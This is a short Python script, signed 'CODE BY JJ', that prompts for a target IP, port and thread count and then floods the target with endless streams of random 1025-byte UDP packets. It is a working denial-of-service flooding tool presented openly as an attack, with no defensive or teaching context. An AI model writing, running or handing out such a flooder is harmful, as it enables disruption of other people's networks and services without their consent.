# CODE BY JS

import random
import socket
import threading
from colorama import Fore, init
import pyfiglet

banner = pyfiglet.figlet_format("JJ  ALPHA")
print(banner)

ip = str(input("Target IP : "))
port = int(input("PORT : "))
choice = "y",
times = int(input("time(s) : "))
threads = int(input("Threads : "))
def run():
	data = random._urandom(1025)
	i = random.choice(("CODE BY JJ"," --> ATTACK"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"CODE BY JJ --> " + ip +" --> ATTACK !")
		except:
			print("CODE BY JJ --> " + ip + " ERROR !")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run)
		th.start()
if __name__ == "__main__":
    threading.main_thread